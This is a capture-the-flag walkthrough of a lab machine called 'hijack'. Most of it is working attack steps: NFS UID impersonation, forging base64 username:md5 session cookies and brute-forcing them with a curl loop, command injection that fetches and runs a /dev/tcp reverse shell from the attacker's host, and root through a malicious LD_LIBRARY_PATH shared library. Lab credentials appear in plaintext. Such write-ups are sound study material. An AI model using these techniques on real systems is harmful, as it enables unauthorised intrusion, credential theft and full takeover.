# hijack

## Recon
```bash
silent-scan $TARGET
nmap -sVC -p21,22,80,111,2049,43595,46241,49570,57793 $TARGET -oN service
```

**Output**
```
PORT      STATE SERVICE  VERSION
21/tcp    open  ftp      vsftpd 3.0.3
22/tcp    open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:ee:e5:23:de:79:6a:8d:63:f0:48:b8:62:d9:d7:ab (RSA)
|   256 42:e9:55:1b:d3:f2:04:b6:43:b2:56:a3:23:46:72:c7 (ECDSA)
|_  256 27:46:f6:54:44:98:43:2a:f0:59:ba:e3:b6:73:d3:90 (ED25519)
80/tcp    open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Home
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.18 (Ubuntu)
111/tcp   open  rpcbind  2-4 (RPC #100000)
2049/tcp  open  nfs      2-4 (RPC #100003)
43595/tcp open  mountd   1-3 (RPC #100005)
46241/tcp open  nlockmgr 1-4 (RPC #100021)
49570/tcp open  mountd   1-3 (RPC #100005)
57793/tcp open  mountd   1-3 (RPC #100005)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
___

## Enumeration

### NFS

```bash
showmount -e $TARGET
```

**Output:**
```
Export list for 10.130.140.158:
/mnt/share *
```

The share is open to any host (`*`). When mounting and trying to list the contents, access is denied:

```bash
mkdir /tmp/nfs_mount
sudo mount -t nfs $TARGET:/mnt/share/ /tmp/nfs_mount -o nolock
sudo ls -la /tmp/nfs_mount
# ls: cannot open directory '/tmp/nfs_mount': Permission denied
```

Inspecting the permissions of the mounted directory:

```
drwx------  2 1003 1003 4.0K Aug  8  2023 nfs_mount
```

The directory belongs to UID `1003`, which doesn't exist locally. NFS authenticates by UID, so simply creating a local user with that same UID grants access.

**NFS UID Hijack:**

```bash
sudo useradd -u 1003 temp_user
sudo su temp_user
cd /tmp/nfs_mount
cat for_employees.txt
```

**Output:**
```
ftp creds :

ftpuser:W3stV1rg1n14M0un741nM4m4
```

FTP credentials obtained.

---

### FTP

```bash
ftp $TARGET
ls -la
get *
```

**Output:**
```
.  ..  .from_admin.txt  .passwords_list.txt  service  silent  test.txt
```

```bash
cat .from_admin.txt
```

```
To all employees, this is "admin" speaking,
i came up with a safe list of passwords that you all can use on the site, these passwords
don't appear on any wordlist i tested so far, so i encourage you to use them, even me i'm
using one of those.
NOTE To rick : good job on limiting login attempts, it works like a charm, this will
prevent any future brute forcing.
```

We extract two key pieces of information: user **admin** and a list of passwords in `.passwords_list.txt`.

---

### Web — Cookie Analysis

When creating an account and logging in, the `PHPSESSID` cookie is base64 encoded:

```bash
echo "bmlrOmUxMGFkYzM5NDliYTU5YWJiZTU2ZTA1N2YyMGY4ODNl" | base64 -d
# nik:e10adc3949ba59abbe56e057f20f883e
```

The structure is `username:md5(password)` — which allows **forging sessions** for any user by knowing or cracking their hash.

---

### Web — Admin Cookie Hijack

With the password list from FTP, we MD5 hash each one, construct the cookie as `admin:hash` in base64, and test it against `/administration.php`:

```bash
#!/bin/bash
TARGET="10.130.140.158"
PASSFILE=".passwords_list.txt"

while IFS= read -r pass; do
    hash=$(echo -n "$pass" | md5sum | cut -d' ' -f1)
    cookie=$(echo -n "admin:$hash" | base64)
    result=$(curl -s -b "PHPSESSID=$cookie" "http://$TARGET/administration.php")

    echo "[-] Testing: $pass"

    if echo "$result" | grep -qi "Administration Page"; then
        echo "[+] Password found: $pass"
        echo "[+] Cookie: PHPSESSID=$cookie"
        exit 0
    fi

done < "$PASSFILE"
```

**Output:**
```
[+] Password found: <password>
[+] Cookie: PHPSESSID=<cookie>
```

---

## Foothold — Command Injection

The administration panel has a field to check service status. The filter blocks `;` and other separators but not `&&`.

We upload a reverse shell to the victim server:

```bash
# On kali
echo 'bash -i >& /dev/tcp/192.168.160.214/4242 0>&1' > shell.sh
python3 -m http.server 8080
```

From the service field we download the shell to `/tmp`:

```
ssh&&curl http://192.168.160.214:8080/shell.sh -o /tmp/shell.sh
```

With the listener active we execute:

```bash
nc -lvnp 4242
```

In the service field:

```
&&bash /tmp/shell.sh
```

**Shell obtained as `www-data`.**

---

### Stabilize shell


```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
reset
```

---

### Post-Exploitation Enumeration

```bash
cat /var/www/html/config.php
```

**Output:**
```
$servername = "localhost";
$username = "rick";
$password = "N3v3rG0nn4G1v3Y0uUp";
$dbname = "hijack";
```

Rick's credentials found in the web config. We try them via SSH:

```bash
ssh rick@$TARGET
# N3v3rG0nn4G1v3Y0uUp
whoami
cat user.txt
sudo -l
```

**Output:**
```
User rick may run the following commands on Hijack:
    (root) /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
    env_keep+=LD_LIBRARY_PATH
```

---

## Privesc — LD_LIBRARY_PATH Hijack

`sudo` preserves `LD_LIBRARY_PATH` thanks to `env_keep`. We check the libraries loaded by apache2:

```bash
ldd /usr/sbin/apache2
```

**Output:**
```
libcrypt.so.1 => /lib/x86_64-linux-gnu/libcrypt.so.1
```

We create a malicious shared library with the same name as one of the libraries loaded by apache2:

```bash
cat > /tmp/evil.c << EOF
#include <stdio.h>
#include <stdlib.h>

void __attribute__((constructor)) init() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
EOF

gcc -shared -fPIC -o /tmp/libcrypt.so.1 /tmp/evil.c
```

By running apache2 with sudo pointing `LD_LIBRARY_PATH` to `/tmp`, it loads our library instead of the real one and executes the constructor:

```bash
sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
```

**Output:**
```
root@Hijack:~# whoami
root
cat /root/root.txt
```

**Root obtained.**
---

## Related Notes
- [nmap](../../../tools/recon/nmap.md)
- [showmount](../../../tools/recon/showmount.md)
- [nfs-uid-hijack](../../../exploits/network-services/nfs-uid-hijack.md)
- [cookie-base64-md5-forgery](../../../exploits/web-auth/cookie-base64-md5-forgery.md)
- [sudo-ld-library-path](../../../privesc/linux/sudo-ld-library-path.md)
